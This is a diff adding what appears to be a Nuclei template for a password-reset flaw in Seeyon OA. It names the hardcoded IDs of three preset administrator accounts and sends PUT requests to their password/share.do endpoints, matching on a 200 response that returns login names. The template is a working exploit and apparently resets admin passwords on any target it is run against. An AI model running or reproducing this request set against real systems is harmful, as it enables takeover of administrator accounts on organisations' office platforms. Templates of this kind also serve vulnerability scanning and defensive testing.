@@ -1,0 +1,35 @@
+id: seeyon-oa-ucpclogin-reset-passwd
+
+info:
+  name: Seeyon OA ucpcLogin - Reset Password
+  author: qwtd
+  severity: high
+  description: |
+    致远OA-ucpcLogin密码重置漏洞
+    /**     * 系统管理员预置ID     * @deprecated 角色角色化后，废弃不再使用     */
+    public static final Long SYSTEM_ADMIN_ID = -7273032013234748168L;
+    /**     * 审计管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除
+    public static final Long AUDIT_ADMIN_ID = -4401606663639775639L;
+    /**     * 集团管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除     */
+    public static final Long GROUP_ADMIN_ID = 5725175934914479521L;
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA-ucpcLogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
+  tags: 致远互联-OA
+
+http:
+  - method: PUT
+    path:
+      - "{{BaseURL}}/seeyon/rest/orgMember/-7273032013234748168/password/share.do"
+      - "{{BaseURL}}/seeyon/rest/orgMember/-4401606663639775639/password/share.do"
+      - "{{BaseURL}}/seeyon/rest/orgMember/5725175934914479521/password/share.do"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "pinyin"
+          - "pinyinhead"
+          - "loginName"
+      - type: status
+        status:
+          - 200
